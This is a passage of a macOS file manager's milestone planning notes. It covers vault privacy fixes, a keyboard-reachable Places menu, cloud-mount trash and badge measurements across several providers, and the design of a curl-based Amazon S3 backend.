+  Keychain so this Mac won’t ask again" — which is what makes the first sentence actionable rather
+  than merely frightening; the pack note pairs it with the compatibility fact, because those are the
+  two things a user must know *before* typing, in the order they matter.
+
+#### Deliberately not in scope
+
+- **`zipcrypt` and AES-128** — the first has a published known-plaintext break and must never appear
+  under a checkbox saying "Encrypt"; the second buys nothing on hardware AES. Taken at open.
+- **Encryption for any container but zip.** libarchive's 7-Zip writer refuses `encryption` and tar
+  has no notion of it, so `PackJob` carries no `format` field: it would be a setting with one legal
+  value and a way to ask for an illegal one.
+- **A passphrase for the paths that are not F5.** Preview (`ArchivePreviewCache`) and entering a
+  **nested** archive still fail with `passphraseRequired` rather than prompting, and the encrypted
+  route extracts the **whole** archive rather than the requested members, since libarchive is read
+  sequentially and the reader has no member filter. A member filter plus a per-archive passphrase
+  held for the session — so preview and nested entry can use the one the user already typed — is its
+  own slice, and the doc comment at `ArchiveExtractor.extract` says so at the site. **Both halves
+  have since landed** — the passphrase 2026-08-09 and the member filter 2026-08-25 — see ▸ After
+  M19.
+- **Encrypting in place, or a "protect these files" gesture that removes the plaintext.** The delete
+  is the dangerous half, and it belongs to the user, with the Trash's own rules in view. Dirnex
+  creates and populates; it never removes the originals, because "encrypt these files" naively
+  implemented is create → copy → delete, and that delete puts plaintext in the Trash.
+
+#### Follow-up (2026-08-09): the leak §6 named, and the one it did not
+
+The milestone closed with one clause of its own §6 mitigation unshipped — Spotlight's index, Quick
+View's caches and the thumbnail store were to be "a stated Slice 2 decision rather than silence", and
+nothing in the app or the docs said anything about them. Closing it started with measuring the three,
+and the measurement inverted the whole item: **none of them is real, and the leak that is real
+belongs to Dirnex.**
+
+- **Spotlight does not index a disk-image volume at all.** `mdutil -s` on the mounted vault reports
+  `Indexing disabled`, no `.Spotlight-V100` appears, `mdfind -onlyin` returns nothing. The two
+  controls are what make that a finding rather than a hope: the boot volume reports `Indexing
+  enabled` in the same run, and an **unencrypted** sparsebundle is also disabled — so it is a
+  property of disk images, not something the encryption is buying. It also settles Recents for free,
+  since that is an `mdfind` query.
+- **Nothing was cached for a thumbnail.** A real `QLThumbnailGenerator` request against a file on the
+  volume produced one, after which no file under the user's caches directory named it and the
+  thumbnail agent's store held nothing — before or after the detach.
+- **Dirnex's own two stores were writing the file names to `UserDefaults` in the clear.**
+  `FrecencyStore.recordVisit` records every `.local` directory and a mounted vault is local;
+  `PersistedTab` carries the directory, the cursor's file name, the marked names and the expanded
+  folders. Both survive locking. A vault's entire promise is that locking puts its contents out of
+  reach, and a list of what was in it — written by the file manager, sitting outside the encrypted
+  image — is the exact shape of thing that promise is about.
+
+So the clause was closed by **fixing** rather than by stating. `VaultPrivacy` (core, 12 tests) owns
+the rule — which mount points count, and whether a path is inside one, on a whole-component boundary
+and with both spellings normalized — and `VaultMounts` (app) holds the live list, told directly by
+Dirnex's own unlock and lock and by `NSWorkspace`'s mount notifications for a vault opened in Disk
+Utility. `Frecency.forget(where:)` is the second wall, run at lock, for anything recorded before the
+notification landed. The app's existing `isPath(_:inside:)` now defers to the core predicate, so the
+pane-eviction rule and the privacy rule cannot become two answers to one question.
+
+**The line drawn, and it is the interesting part: implicit memory only.** Frecency and session
+restore are things the user never asked for, so they refuse a vault path. A named workspace, a
+favorite, a saved search are things the user filled deliberately, and they keep working — silently
+dropping half of something someone saved by name is a worse surprise than remembering it, and it is
+visible to them where a frecency index is not.
+
+Verified live, headlessly, with a control: the AppleScript `reveal` verb drives a pane, `defaults
+export` plus a decoder answers "does any stored key mention this token", and a **control folder**
+browsed in the same session must *appear* — it travels the identical `recordVisit` / `persistState`
+code, so its absence would mean a blind probe rather than a clean app. Three runs. A vault mounted
+from a shell and browsed: control present in `Dirnex.frecency` **and** `Dirnex.tabs.right`, vault
+token in neither. A quit with a pane still standing inside the vault: that pane persisted an **empty**
+tab list — the fallback-to-Home case `PersistedPane` already documents — and named nothing. And the
+whole cycle driven by Dirnex itself (`go.unlockVault` off a Keychain passphrase, two directories
+deep, then `go.lockVault` from inside): nothing under the volume in any key afterwards. The only
+mentions left are the ones that must be there — the vault's own image path and volume name in
+`Dirnex.vaults`, which is the sidebar row, and the *folder holding the image* in the pane that lock
+evicted. Both live outside the vault. The measurements and the probe's own shape are in
+docs/NOTES.md ▸ Encryption.
+
+### M20 — Every place reachable without the sidebar (S)
+
+Opened 2026-08-12 and closed the same day; all three slices landed 2026-08-12.
+
+M8 made the sidebar "a first-class surface", and for most of what it holds it is the *only* surface.
+With it collapsed — ⌃⌘S, or simply a user who wants the width for two panes — an audit of what is
+still reachable reads:
+
+| Place | With the sidebar hidden |
+|---|---|
+| Favorites | ⌘F and Go ▸ Favorites… |
+| Volumes, cloud mounts | only by typing the path into ⌘L |
+| iCloud Drive | unreachable — the row dispatches a *merge*, so there is no path to type |
+| Vaults | only while the image is under the cursor (`vaultImageUnderCursor`) |
+| Servers | Connect to Server… opens a **new** connection; the saved list is sidebar-only |
+| Saved searches, tags, Recents, the Trash | unreachable — none is a directory, and none has a command |
+
+Six of the nine have exactly one way in. That is the shape docs/NOTES.md records for the vault a pane
+could not open — *a feature whose entire surface is one control* — and the fix is the same: give the
+knowledge more than one face without giving it more than one definition.
+
+**Not the root crumb.** The gesture this opened on was a menu hung off the path bar's "Macintosh HD",
+and it is the wrong anchor for three reasons that are all in the code. `installVirtualLabel` replaces
+the **whole** crumb row for the Trash, Recents, search results and the iCloud merge — the very places
+you most want to leave — so the control would be absent exactly where it is needed; `rebuildCrumbs`
+takes its `rootTitle` as a parameter and an archive trail spans backends, so "Macintosh HD" is not
+even a reliable leading crumb on a real path; and a left-click there already navigates to `/`, with
+the right-click reserved for Copy Path. It is also mouse-only, in an app whose sidebar is most often
+hidden by someone working from the keyboard.
+
+**One funnel, three faces.** The funnel is the point: `SidebarViewController.rebuild()` already
+assembles every section in one place and `activate(rowAt:)` already knows the rules a menu would
+otherwise re-derive — a vault *dispatches*, a tag *searches*, iCloud *merges*, a server *connects*,
+and only four of the ten cases are path navigation at all. A second list would drift from it, which
+is this codebase's most repeated finding.
+
+**Slice 1 — core, landed 2026-08-12.** Purely additive; the app is untouched and did not rebuild.
+8 new tests, 2056 total green, both linters clean. `SidebarPlace`, `SidebarPlaceGroup`,
+`SidebarPlaceSources` and `SidebarPlaces.groups(from:)` — the ordered assembly as a pure value over
+the stores' contents. Every model it names already lives in the core (`FavoriteEntry`,
+`MountedVolume`, `VaultLocation`, `CloudStorageMount`, `SavedSearch`, `ServerConnection`,
+`FinderTag`, `SidebarSection`), so this is §2-shaped rather than a concession, and the sections come
+in `SidebarSection.allCases` order off a switch that stops compiling if a section is added and not
+placed. The rule the whole slice exists to hold: **folding is not an input**, because whether a
+section is collapsed is a state of the sidebar's table and not of the list — building the menu from
+`SidebarViewController.rows` would have silently omitted whole sections, since `append` drops a
+collapsed section's items. A test pins that every populated section survives; the negative controls
+(a reversed section order, a neutered empty-header rule) fail exactly the tests that name them. Tags
+arrive already withdrawn when View ▸ Show Tags is off — a preference about the feature, not something
+to second-guess downstream — and "All Tags…" is deliberately absent, being a disclosure affordance of
+a scrolling list rather than a destination, so the menu will list every known tag instead.
+
+**Slice 2 — the app: Go ▸ Places, landed 2026-08-12.** 6 new app tests, 339 total green, 2056 core,
+both linters and all three CI scripts clean, verified live. `rebuild()` is re-expressed over
+`SidebarPlaces.groups(from:)`, rendering folding, headers, the spacer and the All Tags row on top of
+it; `PlacesMenu` renders the same groups as a submenu per section; and one `activate(_ place:)` funnel
+is what both a row and a menu item dispatch through. Always present whatever the sidebar is doing.
+
+*Corrected 2026-08-12 (Slice 3):* this slice also claimed the menu made "Trash" findable through
+macOS's Help ▸ Search. It does not — **Dirnex declares no Help menu**, so the search field that
+indexes menu items does not exist in this app. Checked by looking at the running menu bar; the claim
+had been written into the plan and `PlacesMenu`'s doc comment without it. Nothing rested on it. Adding
+a Help menu is its own decision and is not taken here.
+
+Three things the slice turned out to need beyond the plan:
+
+- **`SidebarViewController.Row` was a second copy of the vocabulary** — it spelled out all ten
+  destinations — so leaving it would have made the milestone add a *third* spelling of the list
+  rather than consolidate. It is now `case place(SidebarPlace)` plus the three pieces of chrome a
+  *table* adds (header, spacer, All Tags). Its accessors (`favorite`, `savedSearch`, `server`,
+  `vault`, `tag`, `path`) are unchanged, so most call sites never noticed; the drag code, the cell
+  builders and the context menu are the ones that moved.
+- **`SidebarPlacePresentation`**, because the name and glyph were a drift surface the plan had not
+  counted: "Recents", "Trash" and "iCloud Drive" are *translated literals*, and a display string that
+  exists twice gets localized once. Naming lives there for both renderers; how a glyph is finally
+  drawn stays with each, since a 32 pt source-list row and a menu item want different renderings.
+  Transcribing the standard-place symbols turned up the value of doing it — `square.grid.3x3` for
+  `square.grid.3x3.fill` was one character and would have shown up as a slightly wrong Applications
+  icon in one of the two surfaces.
+- **A fresh `NSMenu` per menu-bar rebuild, with one long-lived delegate.** An `NSMenu` can be the
+  submenu of only one item, and `MainMenuBuilder` rebuilds the whole bar whenever a key binding or the
+  language changes — so handing the same menu object to each new Go menu would attach one that still
+  has a supermenu. `NSMenu.delegate` being weak is what makes the reverse arrangement the right one.
+
+Two new strings across the 14 languages (`Places`, `Nothing Here Yet`); the section titles were
+already localized, which is the payoff of `SidebarSection` carrying identity rather than text.
+Verified live with the sidebar hidden: Places lists Recents, the six populated sections and the Trash
+in the sidebar's own order, a volume opens the pane at `/`, the Trash opens as its own tab (the
+destination that had no route at all before), and the Vaults submenu draws the shut and open padlocks
+the sidebar draws for the same two vaults. Tags was toggled on to check the one section whose
+contents deliberately differ — the menu lists every tag with its colored dot, where the sidebar shows
+the stock seven behind "All Tags…" — and toggled back off.
+
+**Slice 3 — the keyboard and the mouse, landed 2026-08-12.** 5 new app tests (344 total), 1 new core
+test (2058), both linters and all three CI scripts clean, verified live with the sidebar hidden.
+`go.places` (⌘G — ⌃G as shipped that day; see below) pops the same menu under the focused pane's
+path bar, structurally the
+`showFavorites` popup; and the path bar's **leading glyph slot** — which both render paths already
+had, `installCrumbs(leadingSymbol:)` and `installVirtualLabel(symbolNamed:)` — is now an
+always-present button onto that menu, so the mouse affordance exists in every mode including the
+virtual ones the root crumb cannot reach. `PlacesMenu.shared` is the one builder all three faces fill
+from, which `NSMenu.delegate` being weak already required of *something*.
+
+The chord was free in the way that matters and was measured rather than assumed: Cocoa's
+`StandardKeyBinding.dict` binds `^b`, `^d`, `^e`, `^f`, `^k`, `^n`, `^p`, `^t`, `^v` and `^y` in every
+text field and **no `^g`** — so unlike the ⌃D popup beside it, this one needed no field-editor
+carve-out and could mean one thing everywhere.
+
+**The pair moved to ⌘F / ⌘G (2026-08-12).** Favorites is ⌘F and Places ⌘G; ⌃D and ⌃G are free. The
+measurement above is what the ⌃-layer choice rested on and it still stands — it is simply no longer
+load-bearing, because the text system claims no ⌘ letter of its own, so *neither* popup needs a
+carve-out now. `validateNavigationItem`'s `showFavorites` case, which existed only to let ⌃D fall
+through to `deleteForward:`, went with it; ⌃T's carve-out stays, since ⌃T still transposes. The
+price of the new pair is stated rather than hidden: ⌘F/⌘G are macOS's Find / Find Next, so a user
+reaching for Find gets Favorites. Nothing in Dirnex claimed them — the file search is ⌥F7 and the
+app declares no Find menu — but a later search or filter feature cannot have them back.
+
+Two things the slice turned out to need beyond the plan:
+
+- **The Go menu carries *two* Places entries, and has to.** An `NSMenuItem` that carries a submenu
+  **never fires its own key equivalent** — measured in a throwaway: `performKeyEquivalent` returns
+  `false` and the action never runs, while the item still reports `isEnabled == true`, and the same
+  item without a submenu fires. The menu bar is this app's only dispatch path for a command shortcut,
+  so hanging ⌘G on `Places ▸` would have drawn a shortcut that is dead. `Places ▸` (browse it there)
+  and `Places…  ⌘G` (drop it at the pane) are therefore two items for two gestures, which is also
+  what `go.favorites` has always been. Pinned against the **built menu**, not against
+  `commandItem(for:)` — a negative control showed the isolated item stays well-formed after the
+  layout stops containing it.
+- **A glyph for the locations that had no kind.** The slot only appeared for a location with a mark
+  of its own (cloud, iCloud, Trash, Recents, search); a plain local path, an archive trail and a
+  connected server had none. `rootSymbolName(for:)` names those: the saved-server row's own symbol by
+  protocol, and the **boot volume's** for anything local — not a guess about the disk, since
+  `rebuildCrumbs` titles the root crumb "Macintosh HD" for every local path, `/Volumes/…` included.
+  `MountedVolume.internalSymbolName` exists so that is one string rather than two, and
+  `serverSymbolName` widened from `private` for the same reason.
+
+Swapping the slot's `NSImageView` for a borderless `NSButton` was measured before it was written —
+same frame, same ink, to the pixel, in the row's real shape — so nothing moved. Verified live with the
+sidebar collapsed: the glyph opens Places on a plain local path, **and from inside the Trash**, which
+is the mode with no crumb row at all and the one the rejected root-crumb anchor could never have
+served; ⌘G drops the same menu in the focused pane; a volume picked from it opens the pane at `/`;
+and clicking the *inactive* pane's glyph opens the place in **that** pane, which is what
+`showPlaces` making its pane active first is for.
+
+Deliberately out of scope: **individual places as ⌘K palette results** (the palette is a registry of
+commands, and places are live data — a different mechanism, worth its own decision); reordering or
+editing places from the menu, which stays the sidebar's job; and a Finder-style "Computer" or
+"Network" destination, which is not a place Dirnex has.
+
+### M21 — Amazon S3, and the mounts we already reach (M)
+
+Opened 2026-08-12 and closed 2026-08-19; nineteen slices plus four follow-up passes against real
+Amazon S3, and the five-provider verification of the mounts half (Google Drive, OneDrive, Dropbox,
+Box, iCloud) that the milestone opened on. M22 was cut and closed inside that span, on 2026-08-16.
+
+Asked as one question — "can we add Dropbox, OneDrive and Amazon?" — and it is three, with three
+different answers. Worth writing down in that shape, because two of the three are settled before any
+code is written.
+
+**Dropbox, OneDrive and Box are already supported and always have been.** `CloudStorageMounts` was
+written provider-agnostic on purpose (§M10 Phase 1), so every File Provider client macOS hosts
+appears in the Cloud section through the ordinary `LocalBackend`, with its own `.Trash` picked up by
+`SidebarLocations.trashDirectories`. There is no backend to write. What was actually wrong is the
+*naming*, and only for one form: OneDrive mounts a SharePoint document library as
+`OneDrive-SharedLibraries-<tenant>`, where the first hyphen falls **inside the provider's name** — so
+the split answered the account `SharedLibraries-Contoso`, and the row drew either a bare "OneDrive"
+(wrong: it is not the user's own drive, and it collides with `OneDrive-Personal`, which produced two
+identically-labelled rows) or an internal English token in a sidebar that ships in fourteen
+languages. Landed 2026-08-12: a known provider id now wins over the hyphen, longest first, with
+`OneDrive-SharedLibraries` → "SharePoint" beside Google's existing entry. Brand names, so the table
+is the right home and not the string catalog.
+
+The half that was **not** done is verification, and it needed the clients installed. **OneDrive was
+verified 2026-08-17** against a real `OneDrive-Personal` mount and **Dropbox 2026-08-18** against a
+real `Dropbox-Home` one; **Box was verified 2026-08-18** against a real `Box-Box` mount, on the same
+afternoon and against the same Google Drive control.
+
+The prediction was right about the badges and wrong about the trash, which is the half worth having
+run. Every OneDrive item — mount root, folders, files — answers `isUbiquitousItem == true`, so
+`isCloudDirectory` opens the gate on the attribute alone and the reads cost 774 µs median, inside
+the 650–1000 µs band iCloud and Drive were budgeted on. No OneDrive-specific code, exactly as
+claimed. The naming was checked through `CloudStorageMounts.mounts()` rather than its tests, in every
+combination: "OneDrive" alone, "SharePoint" alone, and the account moving to the front —
+"Personal — OneDrive", "Contoso — SharePoint" — as soon as a second mount of that family makes it
+load-bearing. The collision that opened this milestone cannot be reproduced.
+
+**The trash is where the assumption broke: OneDrive has no `<mount>/.Trash` and never grows one.**
+Its domain reports its own `.trash` node failing with Cocoa 3328 (*"the feature is not supported"*)
+while still declaring `AllowsTrashing` on every item — so the capability says an item may be trashed,
+not that the provider hosts a trash. A real delete settled it: `LocalBackend.trashItem` on a file
+inside the mount succeeds and answers **`~/.Trash`**, the boot volume's own. The item leaves the
+provider domain entirely. Nothing to fix — `SidebarLocations.trashDirectories` only ever adds a
+mount's `.Trash` *if it exists*, so OneDrive contributes no row and the delete is already visible
+through the `~/.Trash` row — but "every mount has a trash" was Google's habit rather than the rule
+the code was written against, and one constructed row per mount would have been a dead one.
+
+One state is still unmeasured, and this Mac cannot produce it: `NotDownloaded`. The account is pinned
+*Always Available on This Device* (content policy `keepDownloaded` at the root, `lazy` below), so all
+186 files are materialized and no placeholder exists. Eviction cannot be arranged from outside the
+provider either — `evictItem` refuses an ad-hoc binary with `NSFileProviderErrorDomain -2001` and
+macOS 26's `fileproviderctl` has no evict verb — so it waits on someone unpinning a file in Finder.
+Given `isDownloading` and the status keys already read correctly in every other state, the risk it
+carries is small. Details of all of it: NOTES.md ▸ Google Drive (and every other `CloudStorage`
+provider).
+
+**Dropbox repeated the badge result and inverted the trash finding a second time — in the other
+direction.** Verified 2026-08-18 against a team account whose mount root holds a Team Folder and the
+user's own Team Member Folder. Every level answers `isUbiquitousItem == true`, so the gate opens on
+the attribute alone; reads cost 903 µs at the root and 762 µs on a file against 32 µs for an ordinary
+local file measured beside them, inside the same band; and an ordinary file created in a team folder
+was watched going uploading → uploaded in ~4 s, drawn live in the app as the uploading badge — the
+first *transient* this milestone has seen on a third-party provider rather than a settled state. The
+naming needed no table entry and was checked through `CloudStorageMounts.mounts()` in every
+combination: "Dropbox" alone, "Home — Dropbox" beside "Personal — Dropbox" once a second account
+makes the label load-bearing, and — the case that broke OneDrive — a hyphenated *team* name
+(`Dropbox-Acme-Corp`) resolving correctly, because Dropbox's own id carries no hyphen and so the
+first-hyphen fallback is right for it.
+
+The trash is where it inverts. OneDrive taught that a mount may have **no** `.Trash`; Dropbox has
+one — with the `com.apple.fileprovider.trash` marker and a live, reconciled `.trash` node in its own
+domain — and **sends every delete to `~/.Trash` regardless**, Finder's included. The control ran in
+the same binary on the same afternoon: a streaming-mode Google Drive mount answers `<mount>/.Trash`
+for both callers, so it is the provider that differs and not the caller or the OS. Nothing to fix
+again, and for a different reason than last time: the merged Trash is one row over many sources, so
+an unused source is invisible rather than dead. Two things fell out of measuring it. A Dropbox delete
+is **put-back-able** precisely because it lands in the boot trash, which keeps `ptbL`/`ptbN` — and
+A/B'ing that turned up a standing error in NOTES: a *Finder* delete into a Drive mount trash does
+write those records, where `FileManager.trashItem` into the same directory writes none, so Dirnex's
+own Drive deletes are the ones that cannot be put back. And the Dropbox mount **root** is a namespace
+container rather than a folder: a create there never uploads (one was relocated by Dropbox into the
+member folder as `… (view-only conflicts …)`), and an `rm` there is reverted within five seconds,
+while the same operations one level down behave normally. `entryDirectory` lands a click at that root
+whenever a mount has more than one visible child, which a team account always does — so F7, F5 and F8
+there are gestures the provider quietly undoes, with the syscall having succeeded and nothing to
+report. No ubiquity key exposes "view-only", so there is no honest gate to write for it.
+
+**And `NotDownloaded` — open since OneDrive — is now measured.** It could not be reached from a probe
+here either (the same `evictItem` refusal, and `fileproviderctl` still has no evict verb), but unlike
+OneDrive's pinned account the state exists on Dropbox: made online-only in Finder, the file reads
+`st_flags 0x40000060` with `st_blocks` 0 and its real size under its real name, `CloudSyncStorage`
+answers `notDownloaded`, `FileEntry.isDataless` agrees off the listing's own `stat`, and the pane
+draws the download badge beside a row still reporting 3.1 MB. The control worth having is the one no
+screenshot shows: 40 resource-value reads, a real `listDirectory` and the app's per-row scan later,
+it is **still** a placeholder — which is the whole point of the `SF_DATALESS` guard, since one byte
+read would have downloaded it. So every state `CloudItemAttributes` can report has now been seen on a
+third-party provider.
+
+**Box repeated the badge result a third time and inverted the trash finding a third way — and its
+`.Trash` is the one that is not there when you look twice.** Verified 2026-08-18 against a personal
+`Box-Box` mount whose domain had been created that morning. Every level answers
+`isUbiquitousItem == true`, so the gate opens on the attribute alone; reads cost 821 µs at the mount
+root, 605 µs on a folder and 508–829 µs on a file against 27 µs for `/etc/hosts` measured beside
+them, inside the same 650–1000 µs band; and a 72 KB file was watched going `uploading` at 0.54 s →
+`uploaded` at 6.94 s, drawn live in the app as the uploading badge on a 12 MB file while the
+materialized JPG beside it carried none. `.DS_Store` badges as a permanent upload here too — still
+`isUploaded == false` nine minutes on, with two ordinary files in the *same folder* uploaded, which
+is the control that makes it the file name rather than the folder — and `isExcludedFromSync` stays
+`false`, so `.excluded` remains unreachable from what the system reports on a third provider. The
+naming needed no table entry for the same reason Dropbox's did not: Box's own id carries no hyphen,
+so the first-hyphen fallback is right for it, and `Box-Acme-Corp` resolves to the account `Acme-Corp`.
+Checked through `CloudStorageMounts.mounts()` in every combination — the one worth noting is that
+Box's personal account labels itself `Box`, so a second account draws **"Box — Box"** beside
+"Enterprise — Box". Odd-looking, honest, and it does disambiguate.
+
+The trash is a third shape, and it is the first that is not stable in time. OneDrive has no `.Trash`;
+Dropbox has one and never uses it; **Box has one for the first few minutes of a domain's life and then
+does not.** At 13:16, minutes after domain creation, `<mount>/.Trash` was on disk carrying
+`com.apple.fileprovider.trash`, `SF_DATALESS`, 65535 links and a 2 MB size, with a live reconciled
+`.trash` node in the domain — every signal `SidebarLocations.trashDirectories` keys on. By 13:29 the
+node had failed `fetch-children-metadata` twice with **Cocoa 3328**, the exact OneDrive signature, and
+the directory was gone from the filesystem for good; a `stat` reaching into it during the changeover
+returned `ETIMEDOUT`. So the existence filter is doing real work for a third distinct reason, and the
+one that matters is that its answer *changes*: a Box user who opens the Trash in the first minutes
+after installing has a source in the merge that Dirnex will list, pay a timeout on, and correctly skip
+— `ETIMEDOUT` maps to `.io`, not `.permissionDenied`, so `gatherTrash`'s `catch { continue }` drops it
+rather than raising the Full Disk Access sheet at somebody whose grant is fine. Nothing to fix. What is
+unmeasured is how long that timeout is, because the state cannot be re-created: `fileproviderctl` has
+no verb for it, and re-adding the domain would resync the account.
+
+Where a delete lands splits by *caller* here, which no other provider has done. Dirnex's F8 —
+`FileManager.trashItem` through the real `LocalBackend` — answers `~/.Trash`, and the item is
+**put-back-able**, its `ptbL`/`ptbN` pair read back through `TrashPutBack.origins` naming
+`…/Box-Box/badge-probe.bin`. Finder's delete on the same mount, in the same run, returned no
+destination at all and the file is **nowhere on this Mac** — not `~/.Trash`, not any mount trash, not
+any volume — while the Google Drive control in that same run named its own `<mount>/.Trash` for both
+callers. Box declines trashing outright where the others declare it: `cap:rwdpf-e--` on every node,
+`capabilities = 0x2000006F` with bit 4 clear, against Dropbox's and OneDrive's `rwdpfTe--`. With four
+providers now measured, both signals are exhausted — every combination of "declares trashing" and "has
+a `.Trash`" has been seen, and only Google Drive's delete stays in its mount — so **neither predicts
+where an item goes, and a real delete is the only thing that answers.** The practical half is that
+Dirnex's delete is the *more* recoverable of the two on Box, which is the opposite of the asymmetry
+Drive taught.
+
+**`NotDownloaded` was reached without an eviction at all, which is the cheapest route this milestone
+has found to it.** Box offers no way *out* of the downloaded state — `fileproviderctl evaluate` shows
+`MarkForOffline` and no unpin for a file that was never pinned, and `evictItem` still refuses an
+ad-hoc binary — but Box streams by default, so a file uploaded from the **web** and never opened here
+simply arrives as a placeholder. Measured on a 13.8 MB one: `st_flags` **`0x40000060`** —
+`SF_DATALESS|UF_COMPRESSED|UF_TRACKED`, the same word iCloud and Dropbox give, which is why the test
+is a mask and never an equality — `st_blocks` 0, the real size under its real (Cyrillic) name,
+`CloudSyncStorage` answering `notDownloaded` with `isDownloading == false`, `FileEntry.isDataless`
+agreeing off the listing's own `stat`, and the materialized JPG beside it reading `0x00000040` and
+`false` in the same listing as the narrowness control. The pane draws the download badge next to a row
+still reporting 14,5 MB. And the control no screenshot shows: 40 resource-value reads, a real
+`listDirectory`, and then the app's own per-row scan having listed and badged it, it is **still**
+`0x40000060` with `st_blocks` 0 — one byte read would have downloaded it. Worth remembering for the
+next provider: **the way to a placeholder is a file that has never been here, not an eviction of one
+that has.**
+
+**Amazon Drive is not a thing to support.** It shut down 2023-12-31, and WorkDocs was EOL'd in 2025;
+there is no File Provider mount to find. So "Amazon" means **S3**, which is a real backend and the
+rest of this milestone.
+
+#### S3 fits the house pattern, and fights the filesystem
+
+Probed 2026-08-12 before any Swift, and the first probe is what makes the milestone affordable:
+**stock `/usr/bin/curl` 8.7.1 signs SigV4 natively** (`--aws-sigv4 aws:amz:<region>:s3`). Verified
+with a control — a fake key against real AWS returns `InvalidAccessKeyId`, meaning the signature was
+computed and looked up, against an unsigned control returning nothing. So S3 needs **no SDK and no
+dependency**, exactly like `bsdtar` and the FTP backend, and §2's "no proprietary APIs" line holds:
+this is a wire protocol reached with a stock tool, not a vendor SDK. One spelling covers Cloudflare
+R2, Backblaze B2, Wasabi and MinIO, which is most of the value — so S3-compatible endpoints are in
+scope from day one (a custom endpoint plus a path-style flag is nearly free now and awkward to
+retrofit).
+
+What the probes settled, all against real buckets:
+
+- **The classifier is inverted from FTP's.** NOTES.md ▸ curl says "the exit code is the
+  classification" for FTP, where every failure has its own code. S3 speaks HTTP, so `curl` **exits 0**
+  for a missing key, a denied bucket, a bad signature and a wrong region alike (404/403/403/301, all
+  exit 0). The HTTP status plus the `<Code>` element is the answer; the exit code is demoted to "did
+  this reach a server".
+- **A wrong region answers 301 and names the endpoint that would have worked.** So the connect form
+  can *correct* a mistyped region instead of reporting a failure — from outside, a wrong region is
+  otherwise indistinguishable from a missing bucket.
+- **A continuation token must be percent-encoded going back**, or AWS rejects the page with
+  `InvalidArgument`. Measured A/B on the same token in one run. It fails *intermittently*: base64 that
+  happens to carry no `+`, `/` or `=` round-trips raw perfectly, so a bucket small enough never to
+  paginate hides it entirely. **Corrected 2026-08-19 (fourth follow-up, below): the refusal a *raw*
+  token gets is `403 SignatureDoesNotMatch`, and `InvalidArgument` is what a well-encoded but corrupt
+  token earns — and it is `+` and `=` that break it, never `/`.**
+- **Keys and common prefixes come back whole at every depth** (`tiles/1/C/`, not `C/`), so a parser
+  that renders them verbatim draws the full path in every row.
+- **A zero-byte object whose key *is* the prefix is how a flat store holds an empty folder**, and it
+  arrives as an ordinary row in that folder's own listing — rendering as a duplicate of the folder,
+  inside itself.
+
+Slice 1 landed 2026-08-12, core-only and additive (`S3Location`, `S3Key`, `S3ListingParser`,
+`S3ResponseError`; 52 tests, app untouched). The listing fixtures are real AWS bytes from the public
+`sentinel-s2-l1c` bucket rather than written from the documentation, for the reason NOTES.md gives
+about corpora: a hand-written fixture proves the parser agrees with whoever wrote it, and both facts
+above are invisible that way.
+
+Slice 2 landed 2026-08-13 and is the **read half**, still core-only and additive
+(`S3ProcessArguments` with `S3ConfigFile` and `S3WriteOut`, `S3Transport`, `S3Backend`, and
+`ConnectionScopedBackend`; +90 tests, app untouched). A bucket now lists, stats and downloads
+against an injected transport fed the bytes `1000genomes` and `nasa-nex` actually sent. Five things
+were probed first and four of them changed the code that was about to be written:
+
+- **The credential rides on stdin and the signature is provably computed** — `-K -` carrying
+  `user = "<id>:<secret>"` beside `--aws-sigv4`, verified with the control that makes it evidence: a
+  fake key delivered that way comes back `InvalidAccessKeyId` (the key was looked up, so a
+  well-formed signature reached AWS) where the *unsigned* same request answers `NoSuchBucket`.
+- **`curl` sorts the query string itself when signing**, so the URL builder must not. Measured by
+  signing a deliberately out-of-order query, capturing the `Authorization` header, and recomputing
+  SigV4 by hand both ways — the sorted canonical query reproduces `curl`'s signature byte-for-byte
+  and the as-written order does not. Unmeasured, this fails as `SignatureDoesNotMatch` for one user
+  with one prefix.
+- **`x-amz-bucket-region` is on the 301**, which retires the plan's "parse the `<Endpoint>`
+  element": AWS's endpoint element is bucket-prefixed *and* spelled in the legacy dash form
+  (`nasa-nex.s3-us-west-2.amazonaws.com`), which is not a shape this project ever builds. The header
+  is now the primary source and the element the fallback, for S3-compatible servers that send no
+  header.
+- **A stat is one request, and the exact match is the whole rule.** Listing with `prefix=` the key
+  itself separates all three outcomes at once — a `Contents` row of exactly that key is a file, a
+  `CommonPrefixes` of `key/` is a folder, neither is not-found. What makes it sharp is that
+  `prefix=README` came back with four `README.*` siblings and no `README`, so a first-row reading
+  reports a *sibling's* size and date under the name that was asked about.
+- **Resume works and answers 206**, byte-identical to a whole download (a 257 098-byte object
+  resumed from a 100 000-byte partial moved exactly 157 098). Two corollaries: success is the 2xx
+  range and not `== 200`, or every correct resume reads as a failure; and resuming onto an
+  already-*complete* file answers **416**, so the remote size is checked first rather than left to
+  `curl -C -` to discover.
+
+The write half is deliberately not in it. `capabilities` says `.read`, so M5's degradation grays the
+rest out, and the upload payload-signing question below is still the thing that needs credentials to
+settle rather than a mock (the `moto` lesson).
+
+Slice 3 landed 2026-08-13 and is the **app half** — a bucket is now reachable: `S3CurlTransport`,
+the connect sheet's fourth protocol (`ConnectServerS3Fields`), `PanelViewController+ConnectS3`,
+routing and capabilities on `CompositeBackend`, the saved-server endpoint, the path bar's crumbs and
+the sidebar's glyph. Verified live against a local S3-shaped endpoint: connect, list, walk into a
+folder, F5 a file out (byte-exact), reconnect from the saved sidebar row, and F5 *into* the pane
+refused up front. Four things are worth carrying out of it:
+
+- **A refused download used to land in the destination file.** `--output` writes whatever the server
+  sends, and a refusal is still a response — measured against real AWS with a bad key, the
+  destination came away holding a 354-byte `<Error>` document under the object's own name. The
+  transfer arguments now carry `--fail`, which writes nothing and still reports the status through
+  the write-out; `--remove-on-error`, the flag that pairs with it by reflex, is deliberately absent,
+  because it deletes exactly the partial that resume exists to continue from.
+- **The exit code is demoted literally**, which is what the inverted classifier means in code: the
+  transport reads the status out of the labelled write-out and treats a nonzero exit as a failure
+  only when there is *no* status. `--fail`'s exit 22 on a refused transfer is then absorbed for
+  free — the response arrived, it just said no.
+- **Five app sites spelled `isSFTP || isFTP` where they meant "a connected remote"**, which is the
+  trap NOTES.md records from the day FTP arrived beside SFTP. They now read `isRemoteConnection`,
+  with `acceptsUploads` as the deliberately narrower twin S3 is absent from — one line to edit when
+  the write half lands, instead of five to find.
+- **A folder has no date, and formatting the sentinel drew `01.01.1, 02:02`.** An S3 folder is a
+  common prefix rather than an object, so there is nothing to render; `FileEntry.unknownDate` names
+  what four backends were already spelling `.distantPast`, and the Date column draws the same dash
